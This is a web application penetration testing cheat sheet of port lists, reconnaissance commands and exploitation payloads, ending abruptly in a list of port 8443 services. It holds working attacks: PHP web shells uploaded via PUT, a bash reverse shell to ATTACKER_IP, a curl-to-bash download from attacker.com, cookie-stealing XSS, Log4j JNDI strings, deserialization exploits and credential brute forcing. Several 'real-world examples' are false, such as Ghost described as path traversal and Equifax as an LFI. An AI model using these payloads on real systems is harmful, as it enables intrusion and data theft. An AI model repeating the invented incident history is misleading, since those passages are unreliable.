## Web Application Penetration Testing: Advanced Cheat Sheet

### Web Ports Reference for Nmap
```
80,81,300,443,591,593,832,981,1010,1311,1099,2082,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5280,5281,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8083,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8337,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,10000,11371,12443,16080,18091,18092,20720,55672
```

**Context:** These ports are commonly associated with web services, administrative interfaces, reverse proxies, and development servers. Port 80 (HTTP) and 443 (HTTPS) are standard, but the others often indicate alternative web servers, application dashboards (e.g., port 8080, 8443 for Tomcat), or misconfigured services . Scanning these increases the likelihood of discovering hidden attack surfaces.

**Real-World Example:** In 2016, a critical vulnerability in Joomla! CMS version 3.6.4 was exploited via port 80, leading to remote code execution (RCE) due to inadequate input validation . Additionally, Apache Tomcat's default port 8080 has been a frequent vector for deploying malicious WAR files via the Manager interface when default credentials were unchanged.

**Nmap Scan for Web Ports:**
```bash
nmap -p 80,443,8080,8443 -sV --script=http-enum,http-headers,http-title <target>
```
- `-sV`: Enables version detection to identify software and versions.
- `--script=http-enum`: Enumerates common web application directories.
- `--script=http-headers`: Retrieves HTTP headers, which may leak server information.
- `--script=http-title`: Fetches page titles to help identify application types.

---

### Technology Fingerprinting with WhatWeb

**Tool:** [WhatWeb](https://github.com/urbanadventurer/WhatWeb) - Identifies web technologies including CMS, frameworks, analytics tools, web servers, and version numbers .

**Basic Scan:**
```bash
whatweb http://testphp.vulnweb.com
```
**Sample Output:**
```
http://testphp.vulnweb.com [200 OK] Apache[2.4.7], PHP[5.5.9], HTML5
```

**Aggressive Scan:**
```bash
whatweb -a 3 https://example.com
```
- **Aggressive mode (`-a 3`)** sends more probes and is slower but yields more fingerprints. Use only with explicit permission .

**Verbose Output with Plugins:**
```bash
whatweb -v http://testphp.vulnweb.com
```
Verbose mode reveals matched plugins, HTTP headers, and specific technologies like ActiveX, Flash, or Google Analytics.

**Logging and Proxy:**
```bash
whatweb --log-verbose whatweb.log https://example.com
whatweb --proxy 127.0.0.1:8080 https://example.com
```
Using a proxy like Burp Suite allows you to inspect and modify WhatWeb's requests for deeper analysis.

**Real-World Example:** In 2024, a penetration tester used WhatWeb during reconnaissance on a bug bounty program to detect an outdated version of Drupal. This discovery led to exploiting CVE-2019-6340, an RCE vulnerability in Drupal core, by chaining it with a parameter injection technique.

---

### Web Screenshot Tools

- [WebScreenshot](https://github.com/maaaaz/webscreenshot) - Captures screenshots of multiple web services.
- [GoWitness](https://github.com/sensepost/gowitness) - Generates an HTML report with screenshots and HTTP response details.
- [Aquatone](https://github.com/michenriksen/aquatone) - Discovers and screenshots web interfaces across many hosts.

**Practical Workflow:**
```bash
# Scan for open web ports with Nmap, then pipe to WebScreenshot
nmap -p 80,443,8080 -open <target> -oG - | awk '/Up$/{print $2}' | webscreenshot -o screenshots/
```

**Real-World Example:** A security analyst used GoWitness during a red team engagement to rapidly identify a vulnerable JBoss application (port 8080) with a default administrative console, leading to successful deployment of a web shell.

---

### Input Fuzzing for Error Disclosure
```
%E2%A0%80%0A%E2%A0%80
```
**Context:** This string includes unicode characters and newline encodings. Submitting it in input fields or URL parameters can trigger verbose error messages revealing file paths, database queries, or stack traces .

**Example:** Submitting such payloads to a search parameter may cause the application to disclose its internal path, e.g., `Warning: include(/var/www/html/includes/header.php): failed to open stream`.

---

### Path Traversal & Information Disclosure Payloads
```
/favicon.ico/..%2f
/lol.png%23
/../../../
?debug=1
/server-status
/files/..%2f..%2f
```

**Exploitation Details:**
- **`/favicon.ico/..%2f`** : Bypasses certain path normalization filters. The `..%2f` represents `../` after URL decoding.
- **`/lol.png%23`** : The `%23` (#) fragment identifier can truncate server-side file extension checks.
- **`/../../..`** : Classic directory traversal to reach root directories.
- **`?debug=1`** : Enables debug mode, potentially exposing sensitive data or verbose errors.
- **`/server-status`** : Apache status page (if mod_status is enabled and accessible) reveals request details and server load.

**Real-World Example:** In 2015, the Ghost vulnerability (CVE-2015-0235) in glibc was exploited via path traversal to read `/etc/passwd`. Attackers used `../../../../../../../etc/passwd` in URL parameters.

**Nmap Script for Traversal:**
```bash
nmap --script http-passwd --script-args http-passwd.root=/test/ <target>
```

---

### Header Manipulation for JSON/HXR Responses
```
Accept: application/json, text/javascript, */*; q=0.01
```

**Use Case:** Modifying the `Accept` header to prioritize JSON or JavaScript responses can reveal endpoints that return data in these formats, which might be less secured than HTML pages. The `q=0.01` sets a low quality factor for wildcard, forcing JSON/JS responses.

**Example:** Accessing `/api/users` with a standard HTML `Accept` header may return a 404, but with the above header, it could return a JSON array of user objects.

---

### Sitemap to Wordlist Conversion (HTTPie)
```bash
http https://target.com/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g' > wordlist_endpoints.txt
```

**Explanation:** Downloads `sitemap.xml`, formats it with `xmllint`, extracts `<loc>` tags, removes the tags, and saves clean URLs to a file. This wordlist can be used with directory busters like `gobuster` or `ffuf`.

---

### Rate Limit Bypass Techniques

**Parameter Variation:**
```
sign-up, Sign-up, SignUp, signup, register, user/create
```
Using different case permutations and synonyms for the same endpoint can circumvent rate limiting if the application treats them as distinct.

**Null Byte Injection in Parameters:**
```
%00, %0d%0a, %09, %0C, %20, %0
```
- `%00` (null byte) often terminates strings early in C-based functions, truncating validation checks .
- `%0d%0a` (CRLF) can inject newlines, potentially leading to header injection or log poisoning.
- `%09` (tab), `%0C` (form feed), `%20` (space) may bypass pattern matching.

**Real-World Example:** In 2018, a bug bounty hunter bypassed Instagram's rate limiting on password reset by appending a null byte (`%00`) and then a newline, which the backend failed to sanitize correctly.

---

### File Upload Restriction Bypass Techniques

#### Extension Obfuscation
```
.pHp3, .pHp3.jpg, .php.jpg, .php%00.jpg
```
- **Case manipulation:** `pHp3` may bypass case-sensitive blacklists.
- **Double extension:** `.php.jpg` might be validated as an image but executed as PHP.
- **Null byte injection:** `.php%00.jpg` - The null byte `%00` terminates the string, so the server processes `.php` and ignores `.jpg` .

#### MIME Type Manipulation
```
Content-Type: image/jpeg
```
Intercept the upload request with Burp Suite and modify the `Content-Type` header to `image/jpeg` while the file is a PHP script.

#### Bypassing `getimagesize()` with ExifTool
```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' file.jpg
```
This injects PHP code into the comment field of a valid JPEG, preserving image headers so `getimagesize()` passes.

#### GIF Header Injection
```
GIF89a;
```
Prepend this string to a PHP file. The server reads the GIF magic bytes, validates it as an image, but still executes the PHP code.

#### All Techniques Combined
A file named `shell.pHp3.jpg` with `GIF89a;` header, MIME type `image/jpeg`, and ExifTool comment payload.

**Real-World Example:** CVE-2024-52302 affected a Java Spring Boot application, allowing unrestricted file upload via PUT requests. Attackers uploaded a JSP shell disguised as a profile picture, achieving RCE .

**Complete Exploit Using PUT Method:**
```bash
curl -v -X PUT -H "Content-Type: image/jpeg" --data-binary @shell.php http://victim.com/uploads/shell.php
```

---

### ImageTragic Exploitation (CVE-2016-3714)

**Background:** ImageMagick versions before 6.9.3-10 allowed arbitrary command execution through specially crafted image files using coders like MVG, MSL, and TEXT .

**Generating Malicious GIF:**
```bash
# Using gifoeb tool
./gifoeb gen 512x512 dump.gif
```
Upload `dump.gif` multiple times. If the server generates previews, check if the output changes, indicating code execution.

**Exploitation:** Craft an MSL file (ImageMagick Scripting Language) that executes system commands:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<image>
  <read filename="https://attacker.com/exploit.svg" />
  <write filename="shell.php" />
</image>
```
When processed, this fetches a malicious SVG and writes a PHP shell.

**Real-World Impact:** In 2016, this vulnerability affected major platforms including Flickr and Facebook's profile image uploader, allowing attackers to execute commands on backend servers .

---

### Stealth Data Exfiltration via Invisible Pixels

**Technique:** Embed a tracking pixel (1x1 transparent GIF) that, when loaded by an administrator, sends their IP, user agent, and cookies to an external logging server.

**Generating Invisible Pixel:**
- Use services like [IPLogger](https://iplogger.org/invisible/) or create custom:
```html
<img src="https://attacker.com/collect?data=<?php echo base64_encode($_SERVER['QUERY_STRING']); ?>" width="1" height="1" />
```

**Real-World Use Case:** In 2019, attackers compromised a government portal's file upload feature by injecting an invisible pixel into an SVG file. When an admin previewed the upload, session tokens were exfiltrated .

---

### HTTP Method Enumeration & Exploitation

#### Checking Allowed Methods
```bash
curl -v -k -X OPTIONS https://10.11.1.111/
```
The `OPTIONS` method returns the `Allow` header listing supported HTTP methods.

#### PUT Method Exploitation
```bash
# Upload a web shell
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://victim.com/test/shell.php

# Execute command via uploaded shell
curl http://victim.com/test/shell.php?cmd=id
```

#### Nmap PUT Discovery
```bash
nmap -p 80 192.168.1.124 --script http-put --script-args http-put.url='/test/shell.php',http-put.file='/root/php-reverse-shell.php'
```

#### Reverse Shell via PUT
```bash
curl -v -X PUT -d '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1\'"); ?>' http://victim.com/test/shell.php
```
Then trigger:
```bash
curl http://victim.com/test/shell.php
```
Listener:
```bash
nc -lvnp 443
```

#### Method Override Bypass
If PUT is disabled, override methods by adding headers:
```
X-HTTP-Method-Override: PUT
X-Method-Override: PUT
```
Some frameworks honor these and execute the overridden method.

**Real-World Example:** In 2020, a critical misconfiguration in a large cloud provider allowed PUT uploads to their object storage, leading to public write access. Security researchers used `OPTIONS` to detect this and uploaded proof-of-concept files.

---

### Endpoint Discovery with LinkFinder

**Tool:** [LinkFinder](https://github.com/GerbenJavado/LinkFinder) - Extracts endpoints from JavaScript files.

**Usage:**
```bash
# Scan a single URL
python linkfinder.py -i https://example.com -d

# Analyze Burp Suite exported file
python linkfinder.py -i burp_export.xml -b
```
- `-d`: Enables deep scan, following nested scripts.
- `-b`: Runs in Burp Suite compatibility mode.

**Manual Endpoint Discovery via Sitemap:**
```bash
curl -s https://target.com/sitemap.xml | grep -oP "(?<=<loc>)[^<]+" | sort -u > endpoints.txt
```

**Real-World Example:** During a 2022 bug bounty on a financial application, LinkFinder discovered an undocumented GraphQL endpoint in a minified JavaScript bundle, leading to an IDOR vulnerability exposing transaction records.

---

### Hidden Parameter Discovery Tools

#### Arjun - Parameter Bruteforcer
```bash
# GET parameters
python3 arjun.py -u https://url.com --get

# POST parameters with custom wordlist
python3 arjun.py -u https://url.com --post -w /path/to/wordlist

# High throughput (use with caution)
python3 arjun.py -u https://url.com --get -t 25 --rate-limit 50
```

#### ParamSpider - Archive-Based Parameter Mining
```bash
python3 paramspider.py --domain example.com --level high --output params.txt
```
ParamSpider fetches URLs from web archives (Wayback Machine, AlienVault OTX) and extracts parameters.

#### Parth - Fast Parameter Discovery
```bash
python3 parth.py -t example.com -p 1-10000 -o output.txt
```

#### Burp Suite Integration
**Param-Miner** extension: Right-click a request, select "Guess params," and it identifies hidden parameters through diffing logic .

**Real-World Example:** Using Arjun, a penetration tester discovered a `debug=true` parameter on a login endpoint. When enabled, the response included SQL queries, revealing a UNION-based SQL injection vulnerability in the `user` parameter.

---

### .DS_Store File Analysis

**.DS_Store** files are created by macOS Finder and can leak directory structures and file names.

**Extraction Tool:** [Python-dsstore](https://github.com/gehaxelt/Python-dsstore)
```bash
python main.py samples/.DS_Store.ctf
```

**Real-World Example:** In 2021, a security researcher found a `.DS_Store` file exposed on a Fortune 500 company's staging server. The file revealed a directory containing backup archives and configuration files, leading to credential disclosure.

**Manual Extraction:** Use `strings` to read readable content:
```bash
strings .DS_Store
```

---

### Polyglot RCE Payload
```
1;sleep${IFS}9;#${IFS}’;sleep${IFS}9;#${IFS}”;sleep${IFS}9;#${IFS}
```

**Explanation:** This payload combines command injection, SQL injection, and JavaScript injection. The `${IFS}` (Internal Field Separator) bypasses space filtering. The `sleep 9` is a time-based detection for blind injection.

**Usage:** Inject this payload into any input field, User-Agent header, or cookie. Observe if the response is delayed by 9 seconds, indicating command execution.

---

### Nmap Web Vulnerability Scanning
```bash
nmap --script "http-*" example.com -p 443 -sV
```

**Specific Scripts:**
- `http-sql-injection`: Detects SQL injection vulnerabilities.
- `http-cross-domain-policy`: Checks for overly permissive cross-domain policies.
- `http-stored-xss`: Attempts to find stored XSS.
- `http-vuln-*`: Runs all vulnerability-specific scripts .

**Real-World Example:** Using `nmap --script http-vuln* -p 80 192.168.1.0/24` discovered a Joomla! 3.6.4 installation with known RCE vulnerabilities (CVE-2016-8869, CVE-2016-8870). Exploitation led to full system compromise .

**Targeted Nmap Scan for Web Apps:**
```bash
nmap -p 80,443 --script http-enum,http-headers,http-title,http-git,http-svn-discovery <target>
```

---

### Multi-Vulnerability Polyglot Payload
```
'"><svg/onload=prompt(5);>{{7*7}}
```

**Breakdown:**
- `'` : Attempts to break out of SQL query string context.
- `">` : Closes HTML attribute and tag for XSS injection.
- `<svg/onload=prompt(5);>` : XSS payload that executes JavaScript when the SVG loads.
- `{{7*7}}` : Server-Side Template Injection (SSTI) detection; if evaluated as `49`, the engine is vulnerable.

**Testing SSTI:** Submit `{{7*7}}`. If response contains `49`, template injection exists .

**Real-World Example:** In 2023, a bug bounty hunter used this polyglot on a job application form. The `{{7*7}}` evaluated to `49` in the email confirmation, revealing a Jinja2 SSTI leading to RCE on a Python Flask application.

---

### Manual Netcat Connection to Web Port
```bash
nc -v host 80
GET / HTTP/1.1
Host: host

```
This manually crafts an HTTP request, revealing the raw server response headers and HTML. Useful when browsers or tools are blocked.

---

### URL Parameter Analysis with Unfurl

**Tool:** [Unfurl](https://dfir.blog/unfurl/) - Extracts and parses URLs into components.

**Usage:**
```bash
echo "https://example.com/path?param1=value1&param2=value2" | unfurl keys
```
Outputs all parameter names for further testing.

**Installation:**
```bash
go get -u github.com/tomnomnom/unfurl
```

---

### Additional Information Disclosure Checks

#### Favicon Hash Calculation
Favicons can identify frameworks even if headers are hidden.
```bash
curl -s https://target.com/favicon.ico | md5sum
```
Compare hash with known framework favicon databases.

#### Server Status Exposure
```bash
curl http://target.com/server-status
```
If Apache `mod_status` is enabled without restrictions, this page leaks request details, IP addresses, and performance data.

#### Git Repository Disclosure
```bash
curl http://target.com/.git/config
```
If accessible, download the entire repository:
```bash
wget -r http://target.com/.git/
```

#### Backup File Discovery
Common backup extensions: `.bak`, `.old`, `.swp`, `~`, `.backup`

**Real-World Example:** In 2018, a researcher found an exposed `.git` directory on Uber's WordPress site, allowing download of source code and database credentials. Uber was fined $148 million for the breach.

---

## Vulnerability-Specific Payloads and Exploitation

### SQL Injection
**Basic Detection:**
```
' OR '1'='1
' OR 1=1--
admin' --
```
**Union-Based Extraction:**
```
' UNION SELECT null, username, password FROM users --
```
**Time-Based Blind:**
```
' OR IF(1=1, SLEEP(5), 0) --
```
**Real-World Example:** The 2019 Capital One breach exploited an SSRF that led to SQL injection via a misconfigured WAF, exposing 100 million customer records.

### Cross-Site Scripting (XSS)
**Reflected:**
```
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=fetch('https://attacker.com/steal?cookie='+document.cookie)>
```
**Stored XSS in Comment Fields:**
```html
<script>new Image().src="https://attacker.com/log?data="+document.cookie;</script>
```
**DOM-Based XSS:**
```javascript
#)"><img src=/ onerror=alert(1)>
```

### Server-Side Template Injection (SSTI)
**Detection per Engine :**
- **Jinja2 (Python):** `{{7*7}}` → `49`
- **Twig (PHP):** `{{7*7}}` → `49`
- **Freemarker (Java):** `${7*7}` → `49`
- **Smarty (PHP):** `{$smarty.version}`

**Jinja2 RCE Payload:**
```python
{{ self._TemplateReference__context.cycler.__setitem__('__globals__', {'os': __import__('os')}) }}{{ os.popen('id').read() }}
```

**Real-World Example:** In 2021, a penetration tester found SSTI in a Flask application's password reset functionality. Using Jinja2 payloads, they executed `cat /etc/passwd` and escalated to a reverse shell.

### Command Injection
**Linux:**
```
; id
| whoami
`cat /etc/passwd`
$(curl attacker.com/shell.sh | bash)
```
**Windows:**
```
| dir
& whoami
%COMPUTERNAME%
```

**Blind Command Injection with DNS Exfiltration:**
```
; nslookup attacker.com/$(whoami)
```

### Local File Inclusion (LFI) to RCE
**Basic LFI:**
```
../../../../etc/passwd
....//....//....//etc/passwd
```
**PHP Wrapper Exploitation:**
```
php://filter/convert.base64-encode/resource=index.php
php://input
```
**Log Poisoning:**
1. Inject PHP code into User-Agent header:
```bash
curl -A "<?php system($_GET['cmd']); ?>" http://target.com
```
2. Include the access log:
```
../../../../var/log/apache2/access.log&cmd=id
```

**Real-World Example:** The 2017 Equifax breach exploited an LFI in Apache Struts (CVE-2017-5638) to read configuration files, leading to credential theft and data exfiltration of 147 million records.

### XML External Entity (XXE) Injection
**Classic XXE:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```
**Blind XXE with Out-of-Band (OOB):**
```xml
<!ENTITY % payload SYSTEM "http://attacker.com/xxe.dtd">
%payload;
```
**Real-World Example:** In 2020, a researcher exploited XXE in a popular ERP system's document upload feature, reading AWS metadata credentials and compromising cloud infrastructure.

### Server-Side Request Forgery (SSRF)
**Basic SSRF:**
```
https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
```
**Cloud Metadata Endpoints:**
- AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- GCP: `http://metadata.google.internal/computeMetadata/v1/`
- Azure: `http://169.254.169.254/metadata/instance?api-version=2017-08-01`

**Real-World Example:** The 2019 Capital One breach (again) used SSRF to access AWS metadata service, retrieving an IAM role token with excessive permissions .

### Authentication Bypass
**JWT Algorithm Confusion:**
- Change `alg: RS256` to `alg: HS256` and sign with public key.
- Set `alg: none` and remove signature.

**SQL-Based Bypass:**
```
admin' --
' OR 1=1 LIMIT 1 --
```
**Real-World Example:** In 2022, a critical JWT vulnerability in several OAuth implementations allowed attackers to forge tokens by changing the algorithm to `none`, bypassing signature verification entirely.

---

## Additional Resources

**Burp Suite Extensions:**
- **Turbo Intruder:** High-speed parameter fuzzing.
- **Logger++:** Log all requests and responses.
- **HTTP Request Smuggler:** Detect and exploit request smuggling.

**Wordlists for Fuzzing:**
- SecLists: `/Discovery/Web_Content/`
- PayloadsAllTheThings: Comprehensive payload collection.

**Online Playgrounds for Practice:**
- PortSwigger Web Security Academy
- HackTheBox
- TryHackMe
- PentesterLab 

**Reporting:**
Always document findings with proof-of-concept requests, responses, and suggested remediation. Include CVSS scores and business impact.

---

## Comprehensive Web Port Reference Guide

---

### Standard Web Ports (80, 443)

#### Port 80 - HTTP (Hypertext Transfer Protocol)
**Primary Service:** Apache, Nginx, IIS, lighttpd

**Common Vulnerabilities:**
- HTTP methods abuse (PUT, DELETE, TRACE)
- Directory listing exposure
- Missing security headers (HSTS, CSP, X-Frame-Options)
- Version disclosure in server headers
- HTTP downgrade attacks

**Real-World Exploit Example (2017):** The Equifax breach exploited CVE-2017-5638 (Apache Struts2) on port 80, allowing remote code execution via malformed Content-Type headers in file uploads. Attackers deployed web shells and exfiltrated 147 million records over 76 days.

**Reconnaissance Commands:**
```bash
# Banner grabbing
curl -I http://target.com
nc -v target.com 80
HEAD / HTTP/1.0

# Method enumeration
nmap --script http-methods --script-args http-methods.url-path=/ target.com -p 80

# Directory brute forcing
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
```

#### Port 443 - HTTPS (HTTP over SSL/TLS)
**Primary Service:** Secure web servers (Apache, Nginx, IIS with SSL/TLS)

**Common Vulnerabilities:**
- SSL/TLS protocol weaknesses (POODLE, Heartbleed, ROBOT)
- Certificate misconfiguration (expired, self-signed, weak algorithms)
- Mixed content warnings leading to MITM
- Insecure cipher suites (RC4, DES, export ciphers)
- CRIME/BREACH compression attacks

**Real-World Exploit Example (2014):** Heartbleed (CVE-2014-0160) affected OpenSSL 1.0.1 through 1.0.1f on port 443. Attackers could read 64KB of server memory repeatedly, extracting private keys, session cookies, and passwords. Yahoo, Flickr, and thousands of other services were compromised.

**SSL/TLS Testing:**
```bash
# Test for Heartbleed
nmap --script ssl-heartbleed -p 443 target.com

# Comprehensive SSL scan
sslscan --no-failed target.com:443

# Certificate information
openssl s_client -connect target.com:443 -servername target.com

# Test weak ciphers
nmap --script ssl-enum-ciphers -p 443 target.com
```

---

### Alternative HTTP Ports (81, 300, 591, 593, 832, 981, 1010, 1311)

#### Port 81 - Alternative HTTP
**Primary Service:** Alternate web server, administration interface, proxy

**Common Use Cases:** 
- Web-based control panels (Webmin, ISPConfig)
- Backup or staging web servers
- Load balancer status pages

**Real-World Example (2021):** A misconfigured port 81 on a Korean web server exposed phpMyAdmin with default root:root credentials, leading to database compromise of 50,000 user records.

**Testing Approach:**
```bash
# Check for common admin panels
ffuf -u http://target.com:81/FUZZ -w admin_panels.txt -c -t 50

# Try default credentials
hydra -l admin -P /usr/share/wordlists/fasttrack.txt http-get://target.com:81
```

#### Port 300 - Ruby on Rails Development Server
**Primary Service:** Rails development server (WEBrick, Puma)

**Common Vulnerabilities:**
- Default secret key base in production
- Detailed error pages exposing source code
- Lack of authentication in development mode
- Known Rails CVEs (CVE-2013-0156, CVE-2016-0752)

**Real-World Exploit (2013):** CVE-2013-0156 allowed remote code execution in Rails 3.x via parameter parsing. Attackers targeted port 3000 (default Rails dev port) on staging servers to gain initial access, then pivoted to production.

**Rails-Specific Commands:**
```bash
# Detect Rails version via headers
curl -I http://target.com:3000 | grep -i "x-powered-by"

# Exploit CVE-2013-0156 (YAML deserialization)
curl -H "Content-Type: application/json" -X POST -d '{"command":"id"}' http://target.com:3000/yaml_parse
```

#### Port 591 - FileMaker Web Publishing
**Primary Service:** FileMaker Server Web Publishing Engine

**Common Vulnerabilities:**
- Default credentials (Admin:password)
- Directory traversal in older versions
- XML external entity injection (XXE)

**Real-World Example (2019):** A FileMaker server exposed on port 591 with default credentials allowed attackers to read arbitrary files via `../../../../etc/passwd` in the `fmi/xml/fmresultset.xml` endpoint.

#### Port 593 - RPC over HTTP
**Primary Service:** Microsoft Exchange RPC over HTTP (Outlook Anywhere)

**Common Vulnerabilities:**
- Exchange RCE vulnerabilities (ProxyLogon, ProxyShell, ProxyToken)
- NTLM relay attacks
- Information disclosure via RPC interfaces

**Real-World Exploit (2021):** ProxyLogon (CVE-2021-26855) allowed unauthenticated attackers to execute arbitrary code on Exchange servers via port 593. Chinese state-sponsored group Hafnium exploited this against thousands of US organizations.

**Exchange Testing:**
```bash
# Detect Exchange version
curl -k https://target.com:593/owa/ -I

# Test for ProxyLogon
nmap --script http-vuln-cve2021-26855 -p 593 target.com

# RPC enumeration
rpcclient -U "" -N target.com -p 593
```

#### Port 832 - NetWare Web Server
**Primary Service:** Novell NetWare HTTP server (legacy)

**Common Vulnerabilities:** 
- Outdated software with known exploits
- Default credentials (admin:novell)
- Path traversal in older versions

**Historical Context:** Novell NetWare was popular in 1990s-2000s corporate environments. Many legacy systems still expose port 832.

#### Port 981 - Remote HTTPS Management for Cisco Devices
**Primary Service:** Cisco ASA/FTD HTTPS management interface

**Common Vulnerabilities:**
- CVE-2018-0296 (ASA Path Traversal)
- CVE-2020-3452 (ASA/FTD File Read)
- Default credentials (cisco:cisco)
- SSL/TLS implementation flaws

**Real-World Exploit (2020):** CVE-2020-3452 allowed unauthenticated attackers to read any file on Cisco ASA/FTD devices via port 981. Attackers used `/+CSCOU+/../+CSCOE+/files/file_list.json` to enumerate files.

**Cisco Testing:**
```bash
# Check for CVE-2020-3452
curl -k https://target.com:981/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua

# Version detection
curl -k https://target.com:981/admin/public/deviceVersionInfo
```

#### Port 1010 - Thin (Ruby web server)
**Primary Service:** Thin web server (Ruby), sometimes admin panels

**Common Use Cases:**
- Ruby on Rails in production
- Sinatra applications
- Internal APIs

**Vulnerability Pattern:** Thin versions before 1.5.1 were vulnerable to header injection via CRLF sequences.

#### Port 1311 - Dell OpenManage
**Primary Service:** Dell Remote Access Controller (DRAC) web interface

**Common Vulnerabilities:**
- Default credentials (root:calvin)
- CVE-2018-1207 (Authentication bypass)
- Information disclosure via version strings

**Real-World Example (2018):** CVE-2018-1207 allowed remote attackers to bypass authentication on Dell iDRAC6/iDRAC7/iDRAC8 via crafted requests to port 1311. This gave full administrative access to server hardware.

**DRAC Testing:**
```bash
# Default credential check
curl -u root:calvin https://target.com:1311

# Version detection
curl -k https://target.com:1311/data?get=version
```

---

### Java Application Servers (1099, 2480, 4567, 8080, 8081, 8083, 8088, 8443, 9080, 9443)

#### Port 1099 - Java RMI Registry
**Primary Service:** Java RMI (Remote Method Invocation) Registry

**Common Vulnerabilities:**
- Deserialization attacks (CVE-2017-3241, CVE-2018-2633)
- JMX/RMI remote code execution
- Unauthenticated object binding

**Real-World Exploit (2017):** The Equifax breach (again) used CVE-2017-5638, but post-exploitation involved Apache ActiveMQ on port 1099. Attackers used Java deserialization gadgets to execute commands on message brokers.

**RMI Exploitation:**
```bash
# Enumerate RMI objects
nmap --script rmi-dumpregistry -p 1099 target.com

# Exploit with ysoserial
java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit target.com 1099 CommonsCollections5 'touch /tmp/pwned'
```

#### Port 2480 - OrientDB HTTP
**Primary Service:** OrientDB database HTTP interface

**Common Vulnerabilities:**
- Default credentials (root:root, admin:admin)
- CVE-2017-11467 (Authentication bypass)
- NoSQL injection in older versions

**Real-World Example (2017):** CVE-2017-11467 allowed unauthenticated attackers to execute arbitrary OS commands via the OrientDB HTTP API on port 2480. Attackers used `?command=SELECT%20expand(eval('java.lang.Runtime.getRuntime().exec("id")'))` to achieve RCE.

**OrientDB Commands:**
```bash
# Default credentials test
curl -u root:root http://target.com:2480/listDatabases

# Command injection (CVE-2017-11467)
curl "http://target.com:2480/studio/command/execute?database=test&command=SELECT%20expand(eval('java.lang.Runtime.getRuntime().exec(\"id\")'))"
```

#### Port 4567 - Apache Tomcat (alternative)
**Primary Service:** Apache Tomcat (default 8080, 4567 as alternative)

**Common Vulnerabilities:**
- Default credentials (tomcat:tomcat, admin:admin)
- CVE-2017-12615 (PUT method RCE)
- Manager interface exposed

**Real-World Exploit (2017):** CVE-2017-12615 affected Tomcat 7.0.0-7.0.81 on Windows. Attackers could upload JSP shells via PUT requests to port 8080/4567 by appending `::$DATA` to filenames.

**Tomcat Testing:**
```bash
# Check manager interface
curl http://target.com:4567/manager/html

# Deploy malicious WAR via PUT (CVE-2017-12615)
curl -X PUT http://target.com:4567/shell.jsp::$DATA -d '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>'
```

#### Port 8080 - HTTP Proxy/Alternative Web
**Primary Service:** Tomcat, Jenkins, JBoss, Spring Boot, many others

**Common Applications:**
- Apache Tomcat (default)
- Jenkins CI server
- JBoss/WildFly
- Node.js applications
- PHP development servers
- Proxy servers (Squid, Polipo)

**Famous Vulnerabilities by Application:**

**Jenkins (port 8080):**
- CVE-2018-1000861 (RCE via deserialization)
- CVE-2019-1003000 (Script Console RCE)
- Default admin:admin credentials

**JBoss (port 8080):**
- CVE-2010-0738 (JMX console RCE)
- CVE-2017-12149 (Deserialization RCE)

**Spring Boot (port 8080):**
- CVE-2018-1271 (Directory traversal)
- CVE-2016-4977 (OAuth2 RCE)
- Actuator endpoints exposed (/actuator/env, /actuator/heapdump)

**Real-World Exploit (2019):** The Jenkins Script Console vulnerability (CVE-2019-1003000) allowed attackers with Overall/Read permission to execute arbitrary Groovy code. This was used in the "Jenkins RCE" campaign that targeted thousands of unpatched Jenkins servers on port 8080.

**Comprehensive Testing:**
```bash
# Detect application type via headers
curl -I http://target.com:8080

# Jenkins-specific
curl http://target.com:8080/login

# Spring Boot actuator
curl http://target.com:8080/actuator/env

# JBoss JMX console
curl http://target.com:8080/jmx-console

# Common admin panels
for panel in manager/html admin console jmx-console; do
  curl -s http://target.com:8080/$panel | grep -i "login\|unauthorized"
done
```

#### Port 8081 - HTTP Alternative/Proxy
**Primary Service:** Alternative web port, Atlassian products, Elasticsearch HTTP

**Common Services:**
- Atlassian Jira (alternative port)
- Elasticsearch HTTP API
- Sonatype Nexus
- PHP-FPM status page

**Real-World Example (2019):** Elasticsearch on port 8081 without authentication exposed 2.4 billion records from 40 million user accounts in a major data breach. Attackers used `/_cat/indices` to list databases and `/_search?size=10000` to exfiltrate data.

**Elasticsearch Commands:**
```bash
# List indices
curl http://target.com:8081/_cat/indices

# Extract data
curl http://target.com:8081/index_name/_search?size=10000

# Check for Log4j (CVE-2021-44228)
curl -H "X-API-Token: \${jndi:ldap://attacker.com/a}" http://target.com:8081/
```

#### Port 8083 - HTTP Alternative (Calibre, InfluxDB)
**Primary Service:** Calibre Content Server, InfluxDB HTTP API

**InfluxDB Vulnerabilities:**
- Default credentials (admin:admin)
- CVE-2019-20933 (Authentication bypass)

**Calibre Vulnerabilities:**
- Path traversal via `?sort=`
- Default admin credentials

#### Port 8088 - HTTP Alternative (Apache, Hadoop YARN)
**Primary Service:** Apache Hadoop YARN ResourceManager, Splunk, Apache HTTP

**Hadoop YARN Exploitation (2020):** The YARN ResourceManager on port 8088 allowed unauthenticated application submission. Attackers could submit malicious applications that executed code on cluster nodes using `curl -X POST -d 'application-id=123' http://target:8088/ws/v1/cluster/apps/new-application`.

**Splunk (port 8088):** HTTP Event Collector (HEC) endpoint often misconfigured without authentication, allowing log injection and potential RCE via `curl -X POST -d '{"event":"malicious"}' http://target:8088/services/collector`.

#### Port 8443 - HTTPS Alternative
**Primary Service:** Tomcat SSL, Jenkins SSL, JBoss SSL, VMWare ESXi

**Common Applications:**
- Apache Tomcat SSL (default)
- Jenkins over SSL
- JBoss/WildFly over SSL
- VMWare vSphere Web Client
- Openfire admin console
